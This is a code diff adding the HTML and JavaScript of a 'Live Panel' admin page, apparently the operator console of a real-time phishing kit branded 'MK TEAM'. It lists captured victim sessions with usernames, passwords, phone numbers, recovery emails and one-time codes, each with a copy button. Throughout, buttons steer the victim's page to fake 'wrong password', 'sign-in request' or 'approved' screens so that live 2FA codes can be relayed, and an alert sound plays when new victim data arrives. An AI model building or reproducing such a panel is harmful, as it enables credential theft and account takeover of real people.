@@ -1,0 +1,1006 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live Panel</title>
+  <!-- jQuery -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    /* Global Styles */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: #1e1e1e;
+      font-family: Arial, sans-serif;
+      color: #f0f0f0;
+      padding: 10px;
+    }
+    .mklogo img {
+      width: 50px;
+    }
+    h1 {
+      text-align: center;
+      margin: 20px 0;
+      font-weight: 300;
+    }
+    .top-buttons {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .top-buttons a, .top-buttons button {
+      background: #555;
+      color: #fff;
+      border: none;
+      padding: 8px 16px;
+      margin: 4px;
+      border-radius: 4px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .top-buttons a:hover, .top-buttons button:hover {
+      background: #666;
+    }
+    .error-message {
+      background: #aa0000;
+      color: #fff;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 4px;
+      text-align: center;
+    }
+    /* Session Row Styles */
+    .session-row {
+      width: 95%;
+      max-width: 600px;
+      background: #2a2a2a;
+      margin: 10px auto;
+      padding: 10px 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.4);
+      border: 1px solid #444;
+    }
+    .session-header {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    .session-header span {
+      margin: 4px;
+    }
+    .session-status {
+      font-size: 14px;
+    }
+    .status-waiting {
+      animation: blink 1s infinite;
+      color: #0f0;
+    }
+    .showbtn {
+        cursor: pointer;
+        padding: 2px 8px;
+        margin: 4px;
+    }
+    .status-blocked {
+      color: #ff6666;
+      font-weight: bold;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.4; }
+      100% { opacity: 1; }
+    }
+    .waiting-timer {
+      font-size: 13px;
+      color: #ccc;
+      margin-left: 8px;
+    }
+    /* Online indicator styles */
+    .online-indicator {
+      font-size: 14px;
+      color: #0f0;
+      margin-left: 8px;
+      display: inline-flex;
+      align-items: center;
+    }
+    .online-dot {
+      width: 12px;
+      height: 12px;
+      background: #0f0;
+      border-radius: 50%;
+      margin-right: 4px;
+      animation: blink 1s infinite;
+    }
+    .session-details {
+      margin-top: 8px;
+      padding: 8px 0;
+    }
+    .session-field {
+      border-bottom: 1px solid #444;
+      padding: 4px 0;
+      font-size: 14px;
+    }
+    .session-field:last-child {
+      border-bottom: none;
+    }
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #ccc;
+      font-size: 14px;
+      margin-left: 6px;
+    }
+    .copy-msg {
+      font-size: 12px;
+      color: #0f0;
+      margin-left: 5px;
+    }
+    .block-btn {
+      background: #aa0000;
+      color: #fff;
+      border: none;
+      padding: 4px 8px;
+      margin-left: 5px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+    .block-btn:hover {
+      background: #990000;
+    }
+    .session-actions {
+      margin-top: 8px;
+      text-align: center;
+    }
+    .session-actions button {
+      background: #555;
+      color: #fff;
+      border: none;
+      padding: 6px 12px;
+      margin: 4px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      font-size: 13px;
+    }
+    .session-actions button:hover {
+      background: #666;
+    }
+    .wrongbtn {
+      background: #004FEE !important;
+      color: #fff !important;
+    }
+    .wrongbtn:hover {
+      background: #004EA0 !important;
+    }
+    .delbtn {
+      background: #dd0c0c;
+      color: #fff;
+    }
+    .delbtn:hover {
+      background: #bd0505;
+    }
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+    }
+    .modal .modal-content {
+      background: #333;
+      padding: 20px;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 320px;
+      text-align: center;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .modal input[type="text"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 10px;
+      border: 1px solid #555;
+      border-radius: 4px;
+      background: #444;
+      color: #fff;
+    }
+    .modal button {
+      padding: 6px 12px;
+      margin: 4px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      background: #555;
+      color: #fff;
+      transition: background 0.3s ease;
+      font-size: 14px;
+    }
+    .modal button:hover {
+      background: #666;
+    }
+    /* Responsive adjustments */
+    @media (max-width: 480px) {
+      .session-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .session-actions button {
+        font-size: 12px;
+        padding: 4px 8px;
+      }
+    }
+  </style>
+</head>
+<body>
+    <div class="mklogo">
+        <img src="mkteam.svg" alt="MK TEAM">
+    </div>
+    <h1>Live Panel</h1>
+    <div class="top-buttons">
+        <button class="delbtn" onclick="deleteAllSessions()">Delete All Sessions</button>
+        <button class="btn" onclick="toggleBlockedIPs()">View Blocked IPs</button>
+        <button class="btn" onclick="showSessionStats()">Statistics</button>
+        <button class="btn" onclick="logout()">Logout</button>
+    </div>
+    
+    <!-- Session Statistics Modal -->
+    <div id="statsModal" class="modal">
+        <div class="modal-content">
+            <h2>Session Statistics</h2>
+            <div id="stats-content"></div>
+            <button onclick="closeStatsModal()">Close</button>
+        </div>
+    </div>
+    
+    <!-- Blocked IPs Section -->
+    <div id="blocked-ips-section" style="display: none; margin: 20px auto; max-width: 600px; background: #2a2a2a; padding: 20px; border-radius: 8px;">
+        <h2 style="text-align: center; margin-bottom: 15px;">Blocked IPs</h2>
+        <div id="blocked-ips-list"></div>
+        <button onclick="refreshBlockedIPs()" style="margin-top: 10px; padding: 8px 16px; background: #555; color: #fff; border: none; border-radius: 4px;">Refresh</button>
+    </div>
+    <div id="error-message" class="error-message" style="display: none;"></div>
+    <div id="sessions-container"></div>
+
+    <!-- Enhanced audio notification system with MP3 support -->
+    <script>
+        let audioEnabled = true;
+        let audioContext = null;
+        
+        // Initialize audio system
+        function initAudio() {
+            try {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                return true;
+            } catch (error) {
+                console.log('Audio context not supported');
+                return false;
+            }
+        }
+
+        // Play beep sound function (fallback)
+        function playBeepSound() {
+            if (!audioEnabled) return;
+            
+            try {
+                if (!audioContext) {
+                    if (!initAudio()) return;
+                }
+                
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.5);
+            } catch (error) {
+                console.log('Audio notification failed:', error);
+            }
+        }
+
+        // Play MP3 notification (enhanced)
+        function playNotificationSound() {
+            if (!audioEnabled) return;
+            
+            try {
+                // Try to play the enhanced notification sound
+                const audio = new Audio('sound/diste453rgreg34fr.mp3');
+                audio.volume = 0.5;
+                audio.play().catch(() => {
+                    // Fallback to beep sound if MP3 fails
+                    playBeepSound();
+                });
+            } catch (error) {
+                // Final fallback to beep
+                playBeepSound();
+            }
+        }
+
+        // Toggle audio function
+        function toggleAudio() {
+            audioEnabled = !audioEnabled;
+            const btn = document.querySelector('.audio-toggle');
+            if (btn) {
+                btn.textContent = audioEnabled ? '🔊 Audio On' : '🔇 Audio Off';
+                btn.style.background = audioEnabled ? '#555' : '#aa0000';
+            }
+            localStorage.setItem('adminAudioEnabled', audioEnabled);
+        }
+
+        // Load audio preference
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedAudio = localStorage.getItem('adminAudioEnabled');
+            if (savedAudio !== null) {
+                audioEnabled = savedAudio === 'true';
+            }
+            
+            // Add audio toggle button
+            const topButtons = document.querySelector('.top-buttons');
+            if (topButtons) {
+                const audioBtn = document.createElement('button');
+                audioBtn.className = 'btn audio-toggle';
+                audioBtn.textContent = audioEnabled ? '🔊 Audio On' : '🔇 Audio Off';
+                audioBtn.style.background = audioEnabled ? '#555' : '#aa0000';
+                audioBtn.onclick = toggleAudio;
+                topButtons.appendChild(audioBtn);
+            }
+        });
+    </script>
+
+    <!-- Modal for PHONE OTP question -->
+    <div id="phoneOtpModal" class="modal">
+        <div class="modal-content">
+            <h1>Phone OTP</h1>
+            <input type="text" id="phoneOtpQuestion" placeholder="Enter your question">
+            <div>
+                <button onclick="sendPhoneOtpQuestion()">Send</button>
+                <button onclick="closePhoneOtpModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for Sign-In Request -->
+    <div id="signInRequestModal" class="modal">
+        <div class="modal-content">
+            <h1>Sign-In Request</h1>
+            <input type="text" id="signInRequestQuestion1" placeholder="Enter your first question">
+            <input type="text" id="signInRequestQuestion2" placeholder="Enter your second question">
+            <div>
+                <button onclick="sendSignInRequestQuestion()">Send</button>
+                <button onclick="closeSignInRequestModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for Recovery Email -->
+    <div id="recoveryEmailModal" class="modal">
+        <div class="modal-content">
+            <h1>Recovery Email</h1>
+            <input type="text" id="recoveryEmailInput" placeholder="Enter recovery email">
+            <div>
+                <button onclick="sendRecoveryEmail()">Send</button>
+                <button onclick="closeRecoveryEmailModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for Recovery Email Sign-In Request -->
+    <div id="recoveryEmailSignInRequestModal" class="modal">
+        <div class="modal-content">
+            <h1>Recovery Email Sign-In Request</h1>
+            <input type="text" id="recoveryEmailSignInRequestQuestion1" placeholder="Enter code (e.g., 27)">
+            <input type="text" id="recoveryEmailSignInRequestQuestion2" placeholder="Enter device type (e.g., phone)">
+            <div>
+                <button onclick="sendRecoveryEmailSignInRequestQuestion()">Send</button>
+                <button onclick="closeRecoveryEmailSignInRequestModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Check authentication on page load
+        if (!sessionStorage.getItem('admin_authenticated')) {
+            window.location.href = '/admin/login.html';
+        }
+
+        let lastUpdateMap = {}; // store last_update per session
+        let openDetails = {};   // track which sessions have details open
+        let blockedIPs = [];    // list of blocked IPs
+        let phoneOtpSessionId = null;      // current session id for phone OTP
+        let signInRequestSessionId = null;   // current session id for sign-in request
+
+        // Load blocked IPs from API
+        function loadBlockedIPs() {
+            fetch('/api/admin/blocked_ips')
+                .then(response => response.json())
+                .then(data => {
+                    if (Array.isArray(data)) {
+                        blockedIPs = data;
+                    }
+                })
+                .catch(error => console.error('Error loading blocked IPs:', error));
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 5000);
+        }
+
+        function loadSessions() {
+            fetch('/admin/api/poll_sessions')
+                .then(response => {
+                    if (response.status === 401) {
+                        sessionStorage.removeItem('admin_authenticated');
+                        window.location.href = '/admin/login.html';
+                        return;
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data && data.sessions) {
+                        // Sort sessions (newest first)
+                        data.sessions.sort((a, b) => b.last_update - a.last_update);
+
+                        let container = $('#sessions-container');
+                        container.empty();
+                        let newData = false;
+
+                        data.sessions.forEach(function(s) {
+                            let rowClass = 'session-row';
+                            let oldUpdate = lastUpdateMap[s.session_id] || 0;
+                            if (s.last_update > oldUpdate) {
+                                if (s.update_source === 'user') newData = true;
+                                lastUpdateMap[s.session_id] = s.last_update;
+                            }
+
+                            let dateTime = s.last_update ? new Date(s.last_update * 1000).toLocaleString() : '';
+
+                            // Check if session IP is blocked
+                            let isBlocked = (s.ip_address && blockedIPs.indexOf(s.ip_address) !== -1);
+                            let displayStatus = isBlocked ? 'blocked' : (s.status || '');
+                            let statusClass = (displayStatus === 'waiting') ? 'status-waiting' : (displayStatus === 'blocked' ? 'status-blocked' : '');
+
+                            let html = '<div class="' + rowClass + '">';
+                            html += '<div class="session-header">';
+                            html += '<span><strong>Session ID:</strong> ' + (s.session_id || '') + '</span>';
+                            // Online indicator: if s.last_seen exists and is within 10 seconds
+                            let currentTime = Math.floor(Date.now() / 1000);
+                            if (s.last_seen && (currentTime - s.last_seen < 15)) {
+                                html += ' <span class="online-indicator"><span class="online-dot"></span>online</span>';
+                            } else if (s.last_seen && (currentTime - s.last_seen < 60)) {
+                                html += ' <span style="color: #ffa500; font-size: 12px;">recently online</span>';
+                            }
+                            html += '<button class="showbtn" onclick="toggleDetails(\'' + s.session_id + '\')">Show</button>';
+                            html += '<span class="session-status ' + statusClass + '"><strong>Status:</strong> ' + displayStatus + '</span>';
+                            if (displayStatus === 'waiting') {
+                                html += '<span class="waiting-timer" data-last-update="' + s.last_update + '"></span>';
+                            }
+                            html += '</div>';
+
+                            let displayStyle = openDetails[s.session_id] ? 'block' : 'none';
+                            html += '<div class="session-details" id="details-' + s.session_id + '" style="display:' + displayStyle + ';">';
+                            if (s.ip_address) {
+                                html += '<div class="session-field"><strong>IP:</strong> ' + s.ip_address + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.ip_address + '\')">&#128203;</button>' +
+                                        ' <button class="block-btn" onclick="blockIp(\'' + s.ip_address + '\')">Block IP</button></div>';
+                            }
+                            if (s.username) {
+                                html += '<div class="session-field"><strong>Username:</strong> ' + s.username + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.username + '\')">&#128203;</button></div>';
+                            }
+                            if (s.password) {
+                                html += '<div class="session-field"><strong>Password:</strong> ' + s.password + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.password + '\')">&#128203;</button></div>';
+                            }
+                            if (s.password2) {
+                                html += '<div class="session-field"><strong>Wrong Password:</strong> ' + s.password2 + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.password2 + '\')">&#128203;</button></div>';
+                            }
+                            if (s.otp) {
+                                html += '<div class="session-field"><strong>PHONE OTP:</strong> ' + s.otp + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.otp + '\')">&#128203;</button></div>';
+                            }
+                            if (s.otp2) {
+                                html += '<div class="session-field"><strong>Wrong PHONE OTP:</strong> ' + s.otp2 + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.otp2 + '\')">&#128203;</button></div>';
+                            }
+                            if (s.phone) {
+                                html += '<div class="session-field"><strong>Phone:</strong> ' + s.phone + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.phone + '\')">&#128203;</button></div>';
+                            }
+                            if (s.recovery_email) {
+                                html += '<div class="session-field"><strong>Recovery Email:</strong> ' + s.recovery_email + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.recovery_email + '\')">&#128203;</button></div>';
+                            }
+                            if (s.recovery_email_otp) {
+                                html += '<div class="session-field"><strong>Recovery Email OTP:</strong> ' + s.recovery_email_otp + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.recovery_email_otp + '\')">&#128203;</button></div>';
+                            }
+                            if (s.recovery_email_otp2) {
+                                html += '<div class="session-field"><strong>Wrong Recovery Email OTP:</strong> ' + s.recovery_email_otp2 + 
+                                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.recovery_email_otp2 + '\')">&#128203;</button></div>';
+                            }
+                            if (dateTime) {
+                                html += '<div class="session-field"><strong>Date/Time:</strong> ' + dateTime + '</div>';
+                            }
+                            html += '</div>';
+
+                            html += '<div class="session-actions">';
+                            html += '<button onclick="openPhoneOtpModal(\'' + s.session_id + '\')">PHONE OTP</button>';
+                            html += '<button onclick="openSignInRequestModal(\'' + s.session_id + '\')">Sign-In Request</button>';
+                            html += '<button onclick="openRecoveryEmailModal(\'' + s.session_id + '\')">Recovery Email</button>';
+                            html += '<button onclick="openRecoveryEmailSignInRequestModal(\'' + s.session_id + '\')">Recovery Email Sign-In Request</button>';
+                            html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'recovery_email_otp\')">Recovery Email OTP</button>';
+                            html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'waiting\')">Sign In Approved</button>';
+                            html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'phone\')">Phone</button>';
+                            html += '<button class="wrongbtn" onclick="updateStatus(\'' + s.session_id + '\', \'wrong_password\')">WRONG PASSWORD</button>';
+                            html += '<button class="wrongbtn" onclick="updateStatus(\'' + s.session_id + '\', \'wrong-phone_otp\')">WRONG PHONE OTP</button>';
+                            html += '<button class="wrongbtn" onclick="updateStatus(\'' + s.session_id + '\', \'wrong_recovery_email_otp\')">WRONG RECOVERY EMAIL OTP</button>';
+                            html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'success\')">Success</button>';
+                            html += '<button class="delbtn" onclick="deleteSingle(\'' + s.session_id + '\')">Delete</button>';
+                            html += '</div>';
+
+                            html += '</div>';
+
+                            container.append(html);
+                        });
+
+                        if (newData) {
+                            playNotificationSound();
+                        }
+                        updateTimers();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading sessions:', error);
+                    if (error.message.includes('401')) {
+                        sessionStorage.removeItem('admin_authenticated');
+                        window.location.href = '/admin/login.html';
+                    }
+                });
+        }
+
+        function toggleDetails(sessionId) {
+            openDetails[sessionId] = !openDetails[sessionId];
+            const detailsDiv = document.getElementById('details-' + sessionId);
+            if (detailsDiv) {
+                detailsDiv.style.display = openDetails[sessionId] ? 'block' : 'none';
+            }
+        }
+
+        function copyText(btn, text) {
+            navigator.clipboard.writeText(text).then(() => {
+                let msgSpan = document.createElement("span");
+                msgSpan.className = "copy-msg";
+                msgSpan.textContent = "Copied!";
+                btn.parentNode.insertBefore(msgSpan, btn.nextSibling);
+                setTimeout(() => { msgSpan.remove(); }, 2000);
+            }).catch(err => { console.error('Copy failed', err); });
+        }
+
+        function blockIp(ip) {
+            if (confirm("Block IP: " + ip + "?")) {
+                fetch('/admin/api/block_ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ ip: ip })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        loadBlockedIPs(); // Reload blocked IPs
+                        loadSessions(); // Refresh sessions to show blocked status
+                    } else {
+                        showError('Failed to block IP');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error blocking IP:', error);
+                    showError('Error blocking IP');
+                });
+            }
+        }
+
+        function updateStatus(sessionId, newStatus) {
+            fetch('/admin/api/update_status', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    session_id: sessionId, 
+                    status: newStatus 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    loadSessions();
+                } else {
+                    showError('Failed to update status');
+                }
+            })
+            .catch(error => {
+                console.error('Error updating status:', error);
+                showError('Error updating status');
+            });
+        }
+
+        function deleteSingle(sessionId) {
+            if (confirm('Delete this session?')) {
+                fetch('/admin/api/delete_session', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ session_id: sessionId })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        loadSessions();
+                    } else {
+                        showError('Failed to delete session');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error deleting session:', error);
+                    showError('Error deleting session');
+                });
+            }
+        }
+
+        function deleteAllSessions() {
+            if (confirm('Delete all sessions?')) {
+                fetch('/admin/api/delete_all_sessions', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        loadSessions();
+                    } else {
+                        showError('Failed to delete all sessions');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error deleting all sessions:', error);
+                    showError('Error deleting all sessions');
+                });
+            }
+        }
+
+        function logout() {
+            if (confirm('Logout?')) {
+                fetch('/admin/logout', {
+                    method: 'POST'
+                })
+                .then(() => {
+                    sessionStorage.removeItem('admin_authenticated');
+                    window.location.href = '/admin/login.html';
+                })
+                .catch(error => {
+                    console.error('Error logging out:', error);
+                    sessionStorage.removeItem('admin_authenticated');
+                    window.location.href = '/admin/login.html';
+                });
+            }
+        }
+
+        function updateTimers() {
+            $('.waiting-timer').each(function() {
+                let lastUpdate = parseInt($(this).attr('data-last-update'));
+                let waitingSec = Math.floor(Date.now() / 1000) - lastUpdate;
+                $(this).text("Waiting: " + waitingSec + " sec");
+            });
+        }
+
+        // PHONE OTP modal functions
+        function openPhoneOtpModal(sessionId) {
+            phoneOtpSessionId = sessionId;
+            $('#phoneOtpModal').fadeIn(200);
+        }
+        function closePhoneOtpModal() {
+            $('#phoneOtpModal').fadeOut(200);
+            $('#phoneOtpQuestion').val('');
+        }
+        function sendPhoneOtpQuestion() {
+            let question = $('#phoneOtpQuestion').val().trim();
+            if (!question) { 
+                alert("Please enter a question."); 
+                return; 
+            }
+            fetch('/admin/api/update_phone_otp_question', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    session_id: phoneOtpSessionId, 
+                    question: question 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) { 
+                    closePhoneOtpModal(); 
+                    loadSessions(); 
+                } else { 
+                    alert("Error: " + (data.error || 'Unknown error')); 
+                }
+            })
+            .catch(error => {
+                console.error('Error sending phone OTP question:', error);
+                alert("An error occurred.");
+            });
+        }
+
+        // Sign-In Request modal functions
+        function openSignInRequestModal(sessionId) {
+            signInRequestSessionId = sessionId;
+            $('#signInRequestModal').fadeIn(200);
+        }
+        function closeSignInRequestModal() {
+            $('#signInRequestModal').fadeOut(200);
+            $('#signInRequestQuestion1').val('');
+            $('#signInRequestQuestion2').val('');
+        }
+        function sendSignInRequestQuestion() {
+            let question1 = $('#signInRequestQuestion1').val().trim();
+            let question2 = $('#signInRequestQuestion2').val().trim();
+            if (!question1) {
+                alert("Please enter the first question.");
+                return;
+            }
+            fetch('/admin/api/update_sign_in_request_question', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    session_id: signInRequestSessionId, 
+                    question1: question1,
+                    question2: question2 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    closeSignInRequestModal();
+                    loadSessions();
+                } else {
+                    alert("Error: " + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(error => {
+                console.error('Error sending sign-in request question:', error);
+                alert("An error occurred.");
+            });
+        }
+
+        // Recovery Email modal functions
+        let recoveryEmailSessionId = null;
+        
+        function openRecoveryEmailModal(sessionId) {
+            recoveryEmailSessionId = sessionId;
+            $('#recoveryEmailModal').fadeIn(200);
+        }
+        
+        function closeRecoveryEmailModal() {
+            $('#recoveryEmailModal').fadeOut(200);
+            $('#recoveryEmailInput').val('');
+        }
+        
+        function sendRecoveryEmail() {
+            let recoveryEmail = $('#recoveryEmailInput').val().trim();
+            if (!recoveryEmail) {
+                alert("Please enter a recovery email.");
+                return;
+            }
+            
+            fetch('/admin/api/set_recovery_email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    session_id: recoveryEmailSessionId, 
+                    recovery_email: recoveryEmail 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    closeRecoveryEmailModal();
+                    loadSessions();
+                } else {
+                    alert("Error: " + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(error => {
+                console.error('Error setting recovery email:', error);
+                alert("An error occurred.");
+            });
+        }
+
+        // Recovery Email Sign-In Request modal functions
+        let recoveryEmailSignInRequestSessionId = null;
+        
+        function openRecoveryEmailSignInRequestModal(sessionId) {
+            recoveryEmailSignInRequestSessionId = sessionId;
+            $('#recoveryEmailSignInRequestModal').fadeIn(200);
+        }
+        
+        function closeRecoveryEmailSignInRequestModal() {
+            $('#recoveryEmailSignInRequestModal').fadeOut(200);
+            $('#recoveryEmailSignInRequestQuestion1').val('');
+            $('#recoveryEmailSignInRequestQuestion2').val('');
+        }
+        
+        function sendRecoveryEmailSignInRequestQuestion() {
+            let question1 = $('#recoveryEmailSignInRequestQuestion1').val().trim();
+            let question2 = $('#recoveryEmailSignInRequestQuestion2').val().trim();
+            if (!question1) {
+                alert("Please enter the code.");
+                return;
+            }
+            
+            fetch('/admin/api/update_recovery_email_sign_in_request_question', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    session_id: recoveryEmailSignInRequestSessionId, 
+                    question1: question1,
+                    question2: question2 || 'phone'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    closeRecoveryEmailSignInRequestModal();
+                    loadSessions();
+                } else {
+                    alert("Error: " + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(error => {
+                console.error('Error sending recovery email sign-in request question:', error);
+                alert("An error occurred.");
+            });
+        }
+
+        // Blocked IPs management functions
+        function toggleBlockedIPs() {
+            const section = document.getElementById('blocked-ips-section');
+            if (section.style.display === 'none') {
+                section.style.display = 'block';
+                refreshBlockedIPs();
+            } else {
+                section.style.display = 'none';
+            }
+        }
+
+        function refreshBlockedIPs() {
+            fetch('/admin/api/blocked_ips')
+                .then(response => response.json())
+                .then(data => {
+                    const listDiv = document.getElementById('blocked-ips-list');
+                    listDiv.innerHTML = '';
+                    
+                    if (data.length === 0) {
+                        listDiv.innerHTML = '<p style="text-align: center; color: #888;">No blocked IPs</p>';
+                        return;
+                    }
+                    
+                    data.forEach(ip => {
+                        const ipDiv = document.createElement('div');
+                        ipDiv.style.cssText = 'display: flex; justify-content: space-between; align-items: center; padding: 8px; margin: 4px 0; background: #333; border-radius: 4px;';
+                        ipDiv.innerHTML = `
+                            <span>${ip}</span>
+                            <button onclick="unblockIP('${ip}')" style="background: #aa0000; color: #fff; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer;">Unblock</button>
+                        `;
+                        listDiv.appendChild(ipDiv);
+                    });
+                })
+                .catch(error => console.error('Error loading blocked IPs:', error));
+        }
+
+        function unblockIP(ip) {
+            if (confirm(`Unblock IP: ${ip}?`)) {
+                fetch('/admin/api/unblock_ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ ip: ip })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        refreshBlockedIPs();
+                        loadBlockedIPs(); // Reload blocked IPs cache
+                        loadSessions(); // Refresh sessions to update blocked status
+                    } else {
+                        showError('Failed to unblock IP');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error unblocking IP:', error);
+                    showError('Error unblocking IP');
+                });
+            }
+        }
+
+        // Statistics functions
+        function showSessionStats() {
+            fetch('/admin/api/poll_sessions')
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.sessions) {
+                        const total = data.sessions.length;
+                        const online = data.sessions.filter(s => s.is_online).length;
+                        const waiting = data.sessions.filter(s => s.status === 'waiting').length;
+                        const success = data.sessions.filter(s => s.status === 'success').length;
+                        const blocked = data.sessions.filter(s => s.status === 'blocked').length;
+                        
+                        const statsHtml = `
+                            <div style="text-align: left; margin: 20px 0;">
+                                <p><strong>Total Sessions:</strong> ${total}</p>
+                                <p><strong>Online Now:</strong> ${online}</p>
+                                <p><strong>Waiting:</strong> ${waiting}</p>
+                                <p><strong>Success:</strong> ${success}</p>
+                                <p><strong>Blocked:</strong> ${blocked}</p>
+                                <p><strong>Last Update:</strong> ${new Date().toLocaleString()}</p>
+                            </div>
+                        `;
+                        
+                        document.getElementById('stats-content').innerHTML = statsHtml;
+                        document.getElementById('statsModal').style.display = 'block';
+                    }
+                })
+                .catch(error => console.error('Error loading stats:', error));
+        }
+        
+        function closeStatsModal() {
+            document.getElementById('statsModal').style.display = 'none';
+        }
+
+        // Initialize
+        setInterval(loadSessions, 5000);
+        setInterval(updateTimers, 1000);
+        $(document).ready(function() {
+            loadBlockedIPs();
+            loadSessions();
+        });
+    </script>
+</body>
+</html>
